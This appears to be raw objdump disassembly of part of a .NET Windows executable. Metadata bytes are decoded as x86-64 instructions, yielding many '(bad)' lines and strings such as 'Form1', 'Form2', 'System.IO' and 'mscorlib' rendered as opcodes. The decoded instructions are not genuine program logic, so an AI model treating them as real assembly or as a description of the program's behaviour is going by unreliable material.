   140002555:	01 99 04 0a 00 a0    	add    %ebx,-0x5ffff5fc(%rcx)
   14000255b:	04 ad                	add    $0xad,%al
   14000255d:	06                   	(bad)
   14000255e:	0e                   	(bad)
   14000255f:	00 b8 05 32 04 0e    	add    %bh,0xe043205(%rax)
   140002565:	00 c2                	add    %al,%dl
   140002567:	06                   	(bad)
   140002568:	d0 05 06 00 84 04    	rolb   $1,0x4840006(%rip)        # 0x144842574
   14000256e:	4d 00 06             	rex.WRB add %r8b,(%r14)
   140002571:	00 8a 04 4d 00 0e    	add    %cl,0xe004d04(%rdx)
   140002577:	00 2a                	add    %ch,(%rdx)
   140002579:	07                   	(bad)
   14000257a:	ea                   	(bad)
   14000257b:	06                   	(bad)
   14000257c:	0e                   	(bad)
   14000257d:	00 ad 01 ea 06 06    	add    %ch,0x606ea01(%rbp)
   140002583:	00 69 07             	add    %ch,0x7(%rcx)
   140002586:	e0 04                	loopne 0x14000258c
   140002588:	06                   	(bad)
   140002589:	00 57 01             	add    %dl,0x1(%rdi)
   14000258c:	99                   	cltd
   14000258d:	04 06                	add    $0x6,%al
   14000258f:	00 0a                	add    %cl,(%rdx)
   140002591:	05 e0 04 06 00       	add    $0x604e0,%eax
   140002596:	0d 02 0d 06 0e       	or     $0xe060d02,%eax
   14000259b:	00 36                	add    %dh,(%rsi)
   14000259d:	02 a0 05 06 00 4d    	add    0x4d000605(%rax),%ah
   1400025a3:	02 d0                	add    %al,%dl
   1400025a5:	05 06 00 7c 05       	add    $0x57c0006,%eax
   1400025aa:	2d 06 06 00 15       	sub    $0x15000606,%eax
   1400025af:	05 cb 04 0e 00       	add    $0xe04cb,%eax
   1400025b4:	e0 01                	loopne 0x1400025b7
   1400025b6:	32 04 0e             	xor    (%rsi,%rcx,1),%al
   1400025b9:	00 7e 02             	add    %bh,0x2(%rsi)
   1400025bc:	32 04 0e             	xor    (%rsi,%rcx,1),%al
   1400025bf:	00 95 01 b6 04 06    	add    %dl,0x604b601(%rbp)
   1400025c5:	00 c8                	add    %cl,%al
   1400025c7:	00 99 04 0e 00 b9    	add    %bl,-0x46fff1fc(%rcx)
   1400025cd:	05 32 04 0a 00       	add    $0xa0432,%eax
   1400025d2:	5d                   	pop    %rbp
   1400025d3:	04 ad                	add    $0xad,%al
   1400025d5:	06                   	(bad)
   1400025d6:	0a 00                	or     (%rax),%al
   1400025d8:	af                   	scas   (%rdi),%eax
   1400025d9:	00 ad 06 12 00 f3    	add    %ch,-0xcffedfa(%rbp)
   1400025df:	03 23                	add    (%rbx),%esp
   1400025e1:	04 0a                	add    $0xa,%al
   1400025e3:	00 66 04             	add    %ah,0x4(%rsi)
   1400025e6:	ad                   	lods   (%rsi),%eax
   1400025e7:	06                   	(bad)
   1400025e8:	0e                   	(bad)
   1400025e9:	00 3a                	add    %bh,(%rdx)
   1400025eb:	05 d0 05 0e 00       	add    $0xe05d0,%eax
   1400025f0:	08 01                	or     %al,(%rcx)
   1400025f2:	d0 05 06 00 5f 07    	rolb   $1,0x75f0006(%rip)        # 0x1475f25fe
   1400025f8:	99                   	cltd
   1400025f9:	04 0e                	add    $0xe,%al
   1400025fb:	00 8c 05 ea 06 0e 00 	add    %cl,0xe06ea(%rbp,%rax,1)
   140002602:	47 01 ea             	rex.RXB add %r13d,%r10d
   140002605:	06                   	(bad)
   140002606:	0e                   	(bad)
   140002607:	00 2e                	add    %ch,(%rsi)
   140002609:	07                   	(bad)
   14000260a:	ea                   	(bad)
   14000260b:	06                   	(bad)
   14000260c:	0e                   	(bad)
   14000260d:	00 b1 01 ea 06 06    	add    %dh,0x606ea01(%rcx)
   140002613:	00 f2                	add    %dh,%dl
   140002615:	04 99                	add    $0x99,%al
   140002617:	04 06                	add    $0x6,%al
   140002619:	00 37                	add    %dh,(%rdi)
   14000261b:	00 99 04 16 00 bd    	add    %bl,-0x42ffe9fc(%rcx)
   140002621:	00 51 05             	add    %dl,0x5(%rcx)
   140002624:	06                   	(bad)
   140002625:	00 23                	add    %ah,(%rbx)
   140002627:	00 60 00             	add    %ah,0x0(%rax)
   14000262a:	06                   	(bad)
   14000262b:	00 21                	add    %ah,(%rcx)
   14000262d:	05 e0 04 06 00       	add    $0x604e0,%eax
   140002632:	92                   	xchg   %eax,%edx
   140002633:	06                   	(bad)
   140002634:	e0 04                	loopne 0x14000263a
   140002636:	06                   	(bad)
   140002637:	00 6a 05             	add    %ch,0x5(%rdx)
   14000263a:	e0 04                	loopne 0x140002640
   14000263c:	06                   	(bad)
   14000263d:	00 12                	add    %dl,(%rdx)
   14000263f:	04 99                	add    $0x99,%al
   140002641:	04 06                	add    $0x6,%al
   140002643:	00 d4                	add    %dl,%ah
   140002645:	00 99 04 0e 00 a0    	add    %bl,-0x5ffff1fc(%rcx)
   14000264b:	01 b6 04 00 00 00    	add    %esi,0x4(%rsi)
   140002651:	00 44 00 00          	add    %al,0x0(%rax,%rax,1)
   140002655:	00 00                	add    %al,(%rax)
   140002657:	00 01                	add    %al,(%rcx)
   140002659:	00 01                	add    %al,(%rcx)
   14000265b:	00 00                	add    %al,(%rax)
   14000265d:	00 10                	add    %dl,(%rax)
   14000265f:	00 91 04 4b 05 41    	add    %dl,0x41054b04(%rcx)
   140002665:	00 01                	add    %al,(%rcx)
   140002667:	00 01                	add    %al,(%rcx)
   140002669:	00 01                	add    %al,(%rcx)
   14000266b:	00 10                	add    %dl,(%rax)
   14000266d:	00 31                	add    %dh,(%rcx)
   14000266f:	00 4b 05             	add    %cl,0x5(%rbx)
   140002672:	49 00 01             	rex.WB add %al,(%r9)
   140002675:	00 03                	add    %al,(%rbx)
   140002677:	00 01                	add    %al,(%rcx)
   140002679:	00 10                	add    %dl,(%rax)
   14000267b:	00 3e                	add    %bh,(%rsi)
   14000267d:	00 4b 05             	add    %cl,0x5(%rbx)
   140002680:	49 00 02             	rex.WB add %al,(%r10)
   140002683:	00 0a                	add    %cl,(%rdx)
   140002685:	00 00                	add    %al,(%rax)
   140002687:	00 10                	add    %dl,(%rax)
   140002689:	00 34 06             	add    %dh,(%rsi,%rax,1)
   14000268c:	72 06                	jb     0x140002694
   14000268e:	41 00 03             	add    %al,(%r11)
   140002691:	00 10                	add    %dl,(%rax)
   140002693:	00 00                	add    %al,(%rax)
   140002695:	01 10                	add    %edx,(%rax)
   140002697:	00 9f 06 72 06 8d    	add    %bl,-0x72f98dfa(%rdi)
   14000269d:	00 05 00 14 00 01    	add    %al,0x1001400(%rip)        # 0x141003aa3
   1400026a3:	00 d8                	add    %bl,%al
   1400026a5:	06                   	(bad)
   1400026a6:	68 01 01 00 d8       	push   $0xffffffffd8000101
   1400026ab:	06                   	(bad)
   1400026ac:	68 01 11 00 a5       	push   $0xffffffffa5001101
   1400026b1:	04 6c                	add    $0x6c,%al
   1400026b3:	01 11                	add    %edx,(%rcx)
   1400026b5:	00 85 01 70 01 11    	add    %al,0x11017001(%rbp)
   1400026bb:	00 9b 00 75 01 48    	add    %bl,0x48017500(%rbx)
   1400026c1:	20 00                	and    %al,(%rax)
   1400026c3:	00 00                	add    %al,(%rax)
   1400026c5:	00 91 00 b1 04 79    	add    %dl,0x7904b100(%rcx)
   1400026cb:	01 01                	add    %eax,(%rcx)
   1400026cd:	00 51 20             	add    %dl,0x20(%rcx)
   1400026d0:	00 00                	add    %al,(%rax)
   1400026d2:	00 00                	add    %al,(%rax)
   1400026d4:	86 18                	xchg   %bl,(%rax)
   1400026d6:	c3                   	ret
   1400026d7:	05 06 00 02 00       	add    $0x20006,%eax
   1400026dc:	5c                   	pop    %rsp
   1400026dd:	20 00                	and    %al,(%rax)
   1400026df:	00 00                	add    %al,(%rax)
   1400026e1:	00 c4                	add    %al,%ah
   1400026e3:	00 c9                	add    %cl,%cl
   1400026e5:	01 15 00 02 00 93    	add    %edx,-0x6cfffe00(%rip)        # 0xd30028eb
   1400026eb:	20 00                	and    %al,(%rax)
   1400026ed:	00 00                	add    %al,(%rax)
   1400026ef:	00 81 00 10 07 06    	add    %al,0x6071000(%rcx)
   1400026f5:	00 03                	add    %al,(%rbx)
   1400026f7:	00 cb                	add    %cl,%bl
   1400026f9:	20 00                	and    %al,(%rax)
   1400026fb:	00 00                	add    %al,(%rax)
   1400026fd:	00 86 18 c3 05 06    	add    %al,0x605c318(%rsi)
   140002703:	00 03                	add    %al,(%rbx)
   140002705:	00 e4                	add    %ah,%ah
   140002707:	20 00                	and    %al,(%rax)
   140002709:	00 00                	add    %al,(%rax)
   14000270b:	00 83 00 fc 04 7f    	add    %al,0x7f04fc00(%rbx)
   140002711:	01 03                	add    %eax,(%rbx)
   140002713:	00 54 21 00          	add    %dl,0x0(%rcx,%riz,1)
   140002717:	00 00                	add    %al,(%rax)
   140002719:	00 81 00 4b 07 86    	add    %al,-0x79f8b500(%rcx)
   14000271f:	01 04 00             	add    %eax,(%rax,%rax,1)
   140002722:	8c 21                	mov    %fs,(%rcx)
   140002724:	00 00                	add    %al,(%rax)
   140002726:	00 00                	add    %al,(%rax)
   140002728:	81 00 59 07 8c 01    	addl   $0x18c0759,(%rax)
   14000272e:	05 00 e4 21 00       	add    $0x21e400,%eax
   140002733:	00 00                	add    %al,(%rax)
   140002735:	00 83 00 83 06 36    	add    %al,0x36068300(%rbx)
   14000273b:	01 06                	add    %eax,(%rsi)
   14000273d:	00 0c 22             	add    %cl,(%rdx,%riz,1)
   140002740:	00 00                	add    %al,(%rax)
   140002742:	00 00                	add    %al,(%rax)
   140002744:	c4                   	(bad)
   140002745:	00 c9                	add    %cl,%cl
   140002747:	01 15 00 06 00 44    	add    %edx,0x44000600(%rip)        # 0x184002d4d
   14000274d:	22 00                	and    (%rax),%al
   14000274f:	00 00                	add    %al,(%rax)
   140002751:	00 81 00 10 07 06    	add    %al,0x6071000(%rcx)
   140002757:	00 07                	add    %al,(%rdi)
   140002759:	00 93 22 00 00 00    	add    %dl,0x22(%rbx)
   14000275f:	00 86 18 c3 05 06    	add    %al,0x605c318(%rsi)
   140002765:	00 07                	add    %al,(%rdi)
   140002767:	00 b4 22 00 00 00 00 	add    %dh,0x0(%rdx,%riz,1)
   14000276e:	81 00 9f 06 06 00    	addl   $0x6069f,(%rax)
   140002774:	07                   	(bad)
   140002775:	00 50 23             	add    %dl,0x23(%rax)
   140002778:	00 00                	add    %al,(%rax)
   14000277a:	00 00                	add    %al,(%rax)
   14000277c:	81 00 01 00 92 01    	addl   $0x1920001,(%rax)
   140002782:	07                   	(bad)
   140002783:	00 63 23             	add    %ah,0x23(%rbx)
   140002786:	00 00                	add    %al,(%rax)
   140002788:	00 00                	add    %al,(%rax)
   14000278a:	81 00 12 00 98 01    	addl   $0x1980012,(%rax)
   140002790:	08 00                	or     %al,(%rax)
   140002792:	76 23                	jbe    0x1400027b7
   140002794:	00 00                	add    %al,(%rax)
   140002796:	00 00                	add    %al,(%rax)
   140002798:	83 18 c3             	sbbl   $0xffffffc3,(%rax)
   14000279b:	05 06 00 09 00       	add    $0x90006,%eax
   1400027a0:	80 23 00             	andb   $0x0,(%rbx)
   1400027a3:	00 00                	add    %al,(%rax)
   1400027a5:	00 93 08 78 05 9e    	add    %dl,-0x61fa87f8(%rbx)
   1400027ab:	01 09                	add    %ecx,(%rcx)
   1400027ad:	00 c8                	add    %cl,%al
   1400027af:	23 00                	and    (%rax),%eax
   1400027b1:	00 00                	add    %al,(%rax)
   1400027b3:	00 93 08 6d 01 a3    	add    %dl,-0x5cfe92f8(%rbx)
   1400027b9:	01 09                	add    %ecx,(%rcx)
   1400027bb:	00 df                	add    %bl,%bh
   1400027bd:	23 00                	and    (%rax),%eax
   1400027bf:	00 00                	add    %al,(%rax)
   1400027c1:	00 93 08 79 01 a9    	add    %dl,-0x56fe86f8(%rbx)
   1400027c7:	01 09                	add    %ecx,(%rcx)
   1400027c9:	00 e8                	add    %ch,%al
   1400027cb:	23 00                	and    (%rax),%eax
   1400027cd:	00 00                	add    %al,(%rax)
   1400027cf:	00 96 08 f5 06 b0    	add    %dl,-0x4ff90af8(%rsi)
   1400027d5:	01 0a                	add    %ecx,(%rdx)
   1400027d7:	00 ff                	add    %bh,%bh
   1400027d9:	23 00                	and    (%rax),%eax
   1400027db:	00 00                	add    %al,(%rax)
   1400027dd:	00 86 18 c3 05 06    	add    %al,0x605c318(%rsi)
   1400027e3:	00 0a                	add    %cl,(%rdx)
   1400027e5:	00 08                	add    %cl,(%rax)
   1400027e7:	24 00                	and    $0x0,%al
   1400027e9:	00 00                	add    %al,(%rax)
   1400027eb:	00 91 18 c9 05 b5    	add    %dl,-0x4afa36e8(%rcx)
   1400027f1:	01 0a                	add    %ecx,(%rdx)
   1400027f3:	00 00                	add    %al,(%rax)
   1400027f5:	00 01                	add    %al,(%rcx)
   1400027f7:	00 a8 06 00 00 01    	add    %ch,0x1000006(%rax)
   1400027fd:	00 19                	add    %bl,(%rcx)
   1400027ff:	04 00                	add    $0x0,%al
   140002801:	00 01                	add    %al,(%rcx)
   140002803:	00 71 05             	add    %dh,0x5(%rcx)
   140002806:	00 00                	add    %al,(%rax)
   140002808:	01 00                	add    %eax,(%rax)
   14000280a:	f5                   	cmc
   14000280b:	01 00                	add    %eax,(%rax)
   14000280d:	00 01                	add    %al,(%rcx)
   14000280f:	00 6e 04             	add    %ch,0x4(%rsi)
   140002812:	00 00                	add    %al,(%rax)
   140002814:	01 00                	add    %eax,(%rax)
   140002816:	19 04 00             	sbb    %eax,(%rax,%rax,1)
   140002819:	00 01                	add    %al,(%rcx)
   14000281b:	00 5b 07             	add    %bl,0x7(%rbx)
   14000281e:	00 00                	add    %al,(%rax)
   140002820:	01 00                	add    %eax,(%rax)
   140002822:	5b                   	pop    %rbx
   140002823:	07                   	(bad)
   140002824:	00 00                	add    %al,(%rax)
   140002826:	01 00                	add    %eax,(%rax)
   140002828:	da 03                	fiaddl (%rbx)
   14000282a:	09 00                	or     %eax,(%rax)
   14000282c:	c3                   	ret
   14000282d:	05 01 00 11 00       	add    $0x110001,%eax
   140002832:	c3                   	ret
   140002833:	05 06 00 19 00       	add    $0x190006,%eax
   140002838:	c3                   	ret
   140002839:	05 0a 00 29 00       	add    $0x29000a,%eax
   14000283e:	c3                   	ret
   14000283f:	05 10 00 31 00       	add    $0x310010,%eax
   140002844:	c3                   	ret
   140002845:	05 10 00 39 00       	add    $0x390010,%eax
   14000284a:	c3                   	ret
   14000284b:	05 10 00 41 00       	add    $0x410010,%eax
   140002850:	c3                   	ret
   140002851:	05 10 00 49 00       	add    $0x490010,%eax
   140002856:	c3                   	ret
   140002857:	05 10 00 51 00       	add    $0x510010,%eax
   14000285c:	c3                   	ret
   14000285d:	05 10 00 59 00       	add    $0x590010,%eax
   140002862:	c3                   	ret
   140002863:	05 10 00 61 00       	add    $0x610010,%eax
   140002868:	c3                   	ret
   140002869:	05 15 00 69 00       	add    $0x690015,%eax
   14000286e:	c3                   	ret
   14000286f:	05 10 00 71 00       	add    $0x710010,%eax
   140002874:	c3                   	ret
   140002875:	05 10 00 79 00       	add    $0x790010,%eax
   14000287a:	c3                   	ret
   14000287b:	05 10 00 89 00       	add    $0x890010,%eax
   140002880:	c3                   	ret
   140002881:	05 06 00 e1 00       	add    $0xe10006,%eax
   140002886:	c3                   	ret
   140002887:	05 06 00 e9 00       	add    $0xe90006,%eax
   14000288c:	c3                   	ret
   14000288d:	05 1a 00 f1 00       	add    $0xf1001a,%eax
   140002892:	c3                   	ret
   140002893:	05 06 00 11 01       	add    $0x1110006,%eax
   140002898:	c3                   	ret
   140002899:	05 20 00 81 00       	add    $0x810020,%eax
   14000289e:	c3                   	ret
   14000289f:	05 06 00 21 01       	add    $0x1210006,%eax
   1400028a4:	c9                   	leave
   1400028a5:	01 06                	add    %eax,(%rsi)
   1400028a7:	00 91 00 c9 01 15    	add    %dl,0x1501c900(%rcx)
   1400028ad:	00 29                	add    %ch,(%rcx)
   1400028af:	01 c3                	add    %eax,%ebx
   1400028b1:	05 06 00 31 01       	add    $0x1310006,%eax
   1400028b6:	ab                   	stos   %eax,(%rdi)
   1400028b7:	00 2b                	add    %ch,(%rbx)
   1400028b9:	00 41 01             	add    %al,0x1(%rcx)
   1400028bc:	c3                   	ret
   1400028bd:	05 32 00 91 00       	add    $0x910032,%eax
   1400028c2:	e9 03 38 00 49       	jmp    0x1890060ca
   1400028c7:	01 42 07             	add    %eax,0x7(%rdx)
   1400028ca:	10 00                	adc    %al,(%rax)
   1400028cc:	91                   	xchg   %eax,%ecx
   1400028cd:	00 c3                	add    %al,%bl
   1400028cf:	05 06 00 a1 00       	add    $0xa10006,%eax
   1400028d4:	c3                   	ret
   1400028d5:	05 06 00 a1 00       	add    $0xa10006,%eax
   1400028da:	2c 05                	sub    $0x5,%al
   1400028dc:	49 00 51 01          	rex.WB add %dl,0x1(%r9)
   1400028e0:	2d 01 10 00 51       	sub    $0x51001001,%eax
   1400028e5:	01 ca                	add    %ecx,%edx
   1400028e7:	06                   	(bad)
   1400028e8:	10 00                	adc    %al,(%rax)
   1400028ea:	51                   	push   %rcx
   1400028eb:	01 f8                	add    %edi,%eax
   1400028ed:	00 4f 00             	add    %cl,0x0(%rdi)
   1400028f0:	a1 00 24 07 56 00 a1 	movabs 0x8000a10056072400,%eax
   1400028f7:	00 80 
   1400028f9:	00 56 00             	add    %dl,0x0(%rsi)
   1400028fc:	61                   	(bad)
   1400028fd:	01 d1                	add    %edx,%ecx
   1400028ff:	01 5a 00             	add    %ebx,0x0(%rdx)
   140002902:	a9 00 c3 05 06       	test   $0x605c300,%eax
   140002907:	00 b1 00 03 05 6c    	add    %dh,0x6c050300(%rcx)
   14000290d:	00 a9 00 5d 07 72    	add    %ch,0x72075d00(%rcx)
   140002913:	00 b1 00 c9 01 06    	add    %dh,0x601c900(%rcx)
   140002919:	00 69 01             	add    %ch,0x1(%rcx)
   14000291c:	48 04 82             	rex.W add $0x82,%al
   14000291f:	00 79 01             	add    %bh,0x1(%rcx)
   140002922:	d9 01                	flds   (%rcx)
   140002924:	89 00                	mov    %eax,(%rax)
   140002926:	79 01                	jns    0x140002929
   140002928:	bd 01 90 00 81       	mov    $0x81009001,%ebp
   14000292d:	01 72 04             	add    %esi,0x4(%rdx)
   140002930:	96                   	xchg   %eax,%esi
   140002931:	00 c9                	add    %cl,%cl
   140002933:	00 7b 00             	add    %bh,0x0(%rbx)
   140002936:	a0 00 49 01 24 01 10 	movabs 0xc900100124014900,%al
   14000293d:	00 c9 
   14000293f:	00 72 07             	add    %dh,0x7(%rdx)
   140002942:	b3 00                	mov    $0x0,%bl
   140002944:	89 01                	mov    %eax,(%rcx)
   140002946:	c3                   	ret
   140002947:	05 06 00 c9 00       	add    $0xc90006,%eax
   14000294c:	89 06                	mov    %eax,(%rsi)
   14000294e:	bb 00 0c 00 c3       	mov    $0xc3000c00,%ebx
   140002953:	05 ca 00 99 01       	add    $0x19900ca,%eax
   140002958:	01 07                	add    %eax,(%rdi)
   14000295a:	d0 00                	rolb   $1,(%rax)
   14000295c:	d1 00                	roll   $1,(%rax)
   14000295e:	72 07                	jb     0x140002967
   140002960:	ea                   	(bad)
   140002961:	00 d1                	add    %dl,%cl
   140002963:	00 e3                	add    %ah,%bl
   140002965:	05 f2 00 14 00       	add    $0x1400f2,%eax
   14000296a:	c3                   	ret
   14000296b:	05 ca 00 d9 00       	add    $0xd900ca,%eax
   140002970:	72 07                	jb     0x140002979
   140002972:	06                   	(bad)
   140002973:	01 a9 01 1b 01 0e    	add    %ebp,0xe011b01(%rcx)
   140002979:	01 d1                	add    %edx,%ecx
   14000297b:	00 5d 05             	add    %bl,0x5(%rbp)
   14000297e:	12 01                	adc    (%rcx),%al
   140002980:	d1 00                	roll   $1,(%rax)
   140002982:	3a 01                	cmp    (%rcx),%al
   140002984:	0e                   	(bad)
   140002985:	01 49 01             	add    %ecx,0x1(%rcx)
   140002988:	39 07                	cmp    %eax,(%rdi)
   14000298a:	0e                   	(bad)
   14000298b:	01 c1                	add    %eax,%ecx
   14000298d:	01 72 07             	add    %esi,0x7(%rdx)
   140002990:	20 01                	and    %al,(%rcx)
   140002992:	49 01 1b             	add    %rbx,(%r11)
   140002995:	01 0e                	add    %ecx,(%rsi)
   140002997:	01 d1                	add    %edx,%ecx
   140002999:	00 e6                	add    %ah,%dh
   14000299b:	00 2e                	add    %ch,(%rsi)
   14000299d:	01 d1                	add    %edx,%ecx
   14000299f:	00 65 07             	add    %ah,0x7(%rbp)
   1400029a2:	36 01 f9             	ss add %edi,%ecx
   1400029a5:	00 c3                	add    %al,%bl
   1400029a7:	05 3b 01 19 01       	add    $0x119013b,%eax
   1400029ac:	c3                   	ret
   1400029ad:	05 06 00 d1 01       	add    $0x1d10006,%eax
   1400029b2:	8e 00                	mov    (%rax),%es
   1400029b4:	4d 01 20             	add    %r12,(%r8)
   1400029b7:	00 7b 00             	add    %bh,0x0(%rbx)
   1400029ba:	f0 02 29             	lock add (%rcx),%ch
   1400029bd:	00 9b 00 92 03 2e    	add    %bl,0x2e039200(%rbx)
   1400029c3:	00 0b                	add    %cl,(%rbx)
   1400029c5:	00 c9                	add    %cl,%cl
   1400029c7:	01 2e                	add    %ebp,(%rsi)
   1400029c9:	00 13                	add    %dl,(%rbx)
   1400029cb:	00 d2                	add    %dl,%dl
   1400029cd:	01 2e                	add    %ebp,(%rsi)
   1400029cf:	00 1b                	add    %bl,(%rbx)
   1400029d1:	00 f1                	add    %dh,%cl
   1400029d3:	01 2e                	add    %ebp,(%rsi)
   1400029d5:	00 23                	add    %ah,(%rbx)
   1400029d7:	00 fa                	add    %bh,%dl
   1400029d9:	01 2e                	add    %ebp,(%rsi)
   1400029db:	00 2b                	add    %ch,(%rbx)
   1400029dd:	00 fa                	add    %bh,%dl
   1400029df:	01 2e                	add    %ebp,(%rsi)
   1400029e1:	00 33                	add    %dh,(%rbx)
   1400029e3:	00 0e                	add    %cl,(%rsi)
   1400029e5:	02 2e                	add    (%rsi),%ch
   1400029e7:	00 3b                	add    %bh,(%rbx)
   1400029e9:	00 14 02             	add    %dl,(%rdx,%rax,1)
   1400029ec:	2e 00 43 00          	cs add %al,0x0(%rbx)
   1400029f0:	fa                   	cli
   1400029f1:	01 2e                	add    %ebp,(%rsi)
   1400029f3:	00 4b 00             	add    %cl,0x0(%rbx)
   1400029f6:	2f                   	(bad)
   1400029f7:	02 2e                	add    (%rsi),%ch
   1400029f9:	00 53 00             	add    %dl,0x0(%rbx)
   1400029fc:	0e                   	(bad)
   1400029fd:	02 2e                	add    (%rsi),%ch
   1400029ff:	00 5b 00             	add    %bl,0x0(%rbx)
   140002a02:	0e                   	(bad)
   140002a03:	02 2e                	add    (%rsi),%ch
   140002a05:	00 63 00             	add    %ah,0x0(%rbx)
   140002a08:	6a 02                	push   $0x2
   140002a0a:	2e 00 6b 00          	cs add %ch,0x0(%rbx)
   140002a0e:	94                   	xchg   %eax,%esp
   140002a0f:	02 2e                	add    (%rsi),%ch
   140002a11:	00 73 00             	add    %dh,0x0(%rbx)
   140002a14:	a6                   	cmpsb  (%rdi),(%rsi)
   140002a15:	02 49 00             	add    0x0(%rcx),%cl
   140002a18:	9b                   	fwait
   140002a19:	00 92 03 a3 00 8b    	add    %dl,-0x74ff5cfd(%rdx)
   140002a1f:	00 f5                	add    %dh,%ch
   140002a21:	02 a3 00 93 00 f0    	add    -0xfff6d00(%rbx),%ah
   140002a27:	02 a3 00 83 00 f0    	add    -0xfff7d00(%rbx),%ah
   140002a2d:	02 c3                	add    %bl,%al
   140002a2f:	00 83 00 f0 02 c3    	add    %al,-0x3cfd1000(%rbx)
   140002a35:	00 8b 00 37 03 c0    	add    %cl,-0x3ffcc900(%rbx)
   140002a3b:	01 83 00 f0 02 e0    	add    %eax,-0x1ffd1000(%rbx)
   140002a41:	01 83 00 f0 02 27    	add    %eax,0x2702f000(%rbx)
   140002a47:	00 3f                	add    %bh,(%rdi)
   140002a49:	00 63 00             	add    %ah,0x0(%rbx)
   140002a4c:	77 00                	ja     0x140002a4e
   140002a4e:	9b                   	fwait
   140002a4f:	00 a7 00 26 01 42    	add    %ah,0x42012600(%rdi)
   140002a55:	01 48 01             	add    %ecx,0x1(%rax)
   140002a58:	05 00 01 00 06       	add    $0x6000100,%eax
   140002a5d:	00 03                	add    %al,(%rbx)
   140002a5f:	00 00                	add    %al,(%rax)
   140002a61:	00 7c 05 b9          	add    %bh,-0x47(%rbp,%rax,1)
   140002a65:	01 00                	add    %eax,(%rax)
   140002a67:	00 8d 01 be 01 00    	add    %cl,0x1be01(%rbp)
   140002a6d:	00 08                	add    %cl,(%rax)
   140002a6f:	07                   	(bad)
   140002a70:	c4 01 02 00          	(bad)
   140002a74:	11 00                	adc    %eax,(%rax)
   140002a76:	03 00                	add    (%rax),%eax
   140002a78:	02 00                	add    (%rax),%al
   140002a7a:	12 00                	adc    (%rax),%al
   140002a7c:	05 00 01 00 13       	add    $0x13000100,%eax
   140002a81:	00 05 00 02 00 14    	add    %al,0x14000200(%rip)        # 0x154002c87
   140002a87:	00 07                	add    %al,(%rdi)
   140002a89:	00 c1                	add    %al,%cl
   140002a8b:	00 f8                	add    %bh,%al
   140002a8d:	00 04 80             	add    %al,(%rax,%rax,4)
   140002a90:	00 00                	add    %al,(%rax)
   140002a92:	61                   	(bad)
   140002a93:	00 00                	add    %al,(%rax)
   140002a95:	00 30                	add    %dh,(%rax)
   140002a97:	04 37                	add    $0x37,%al
   140002a99:	00 00                	add    %al,(%rax)
   140002a9b:	00 00                	add    %al,(%rax)
   140002a9d:	00 00                	add    %al,(%rax)
   140002a9f:	00 68 01             	add    %ch,0x1(%rax)
   140002aa2:	00 00                	add    %al,(%rax)
   140002aa4:	04 00                	add    $0x0,%al
	...
   140002aae:	00 00                	add    %al,(%rax)
   140002ab0:	56                   	push   %rsi
   140002ab1:	01 57 00             	add    %edx,0x0(%rdi)
   140002ab4:	00 00                	add    %al,(%rax)
   140002ab6:	00 00                	add    %al,(%rax)
   140002ab8:	04 00                	add    $0x0,%al
	...
   140002ac2:	00 00                	add    %al,(%rax)
   140002ac4:	56                   	push   %rsi
   140002ac5:	01 ad 06 00 00 00    	add    %ebp,0x6(%rbp)
   140002acb:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140002ad6:	00 00                	add    %al,(%rax)
   140002ad8:	56                   	push   %rsi
   140002ad9:	01 99 04 00 00 00    	add    %ebx,0x4(%rcx)
   140002adf:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140002aea:	00 00                	add    %al,(%rax)
   140002aec:	5f                   	pop    %rdi
   140002aed:	01 23                	add    %esp,(%rbx)
   140002aef:	04 00                	add    $0x0,%al
   140002af1:	00 00                	add    %al,(%rax)
   140002af3:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140002afe:	00 00                	add    %al,(%rax)
   140002b00:	56                   	push   %rsi
   140002b01:	01 5c 01 00          	add    %ebx,0x0(%rcx,%rax,1)
   140002b05:	00 00                	add    %al,(%rax)
   140002b07:	00 00                	add    %al,(%rax)
   140002b09:	00 00                	add    %al,(%rax)
   140002b0b:	00 01                	add    %al,(%rcx)
   140002b0d:	00 00                	add    %al,(%rax)
   140002b0f:	00 3e                	add    %bh,(%rsi)
   140002b11:	06                   	(bad)
   140002b12:	00 00                	add    %al,(%rax)
   140002b14:	67 00 e5             	addr32 add %ah,%ch
   140002b17:	00 67 00             	add    %ah,0x0(%rdi)
   140002b1a:	01 01                	add    %eax,(%rcx)
   140002b1c:	00 00                	add    %al,(%rax)
   140002b1e:	00 00                	add    %al,(%rax)
   140002b20:	00 3c 53             	add    %bh,(%rbx,%rdx,2)
   140002b23:	65 74 74             	gs je  0x140002b9a
   140002b26:	69 6e 67 73 3e 62 5f 	imul   $0x5f623e73,0x67(%rsi),%ebp
   140002b2d:	5f                   	pop    %rdi
   140002b2e:	34 5f                	xor    $0x5f,%al
   140002b30:	30 00                	xor    %al,(%rax)
   140002b32:	3c 53                	cmp    $0x53,%al
   140002b34:	65 74 74             	gs je  0x140002bab
   140002b37:	69 6e 67 73 3e 62 5f 	imul   $0x5f623e73,0x67(%rsi),%ebp
   140002b3e:	5f                   	pop    %rdi
   140002b3f:	34 5f                	xor    $0x5f,%al
   140002b41:	31 00                	xor    %eax,(%rax)
   140002b43:	49                   	rex.WB
   140002b44:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140002b46:	75 6d                	jne    0x140002bb5
   140002b48:	65 72 61             	gs jb  0x140002bac
   140002b4b:	62 6c 65 60 31       	(bad)
   140002b50:	00 46 6f             	add    %al,0x6f(%rsi)
   140002b53:	72 6d                	jb     0x140002bc2
   140002b55:	31 00                	xor    %eax,(%rax)
   140002b57:	46 75 6e             	rex.RX jne 0x140002bc8
   140002b5a:	63 60 32             	movsxd 0x32(%rax),%esp
   140002b5d:	00 46 6f             	add    %al,0x6f(%rsi)
   140002b60:	72 6d                	jb     0x140002bcf
   140002b62:	32 00                	xor    (%rax),%al
   140002b64:	3c 4d                	cmp    $0x4d,%al
   140002b66:	6f                   	outsl  (%rsi),(%dx)
   140002b67:	64 75 6c             	fs jne 0x140002bd6
   140002b6a:	65 3e 00 53 79       	gs add %dl,%gs:0x79(%rbx)
   140002b6f:	73 74                	jae    0x140002be5
   140002b71:	65 6d                	gs insl (%dx),(%rdi)
   140002b73:	2e 49                	cs rex.WB
   140002b75:	4f 00 6d 73          	rex.WRXB add %r13b,0x73(%r13)
   140002b79:	63 6f 72             	movsxd 0x72(%rdi),%ebp
   140002b7c:	6c                   	insb   (%dx),(%rdi)
   140002b7d:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%rdx),%esp
   140002b84:	65 6d                	gs insl (%dx),(%rdi)
   140002b86:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
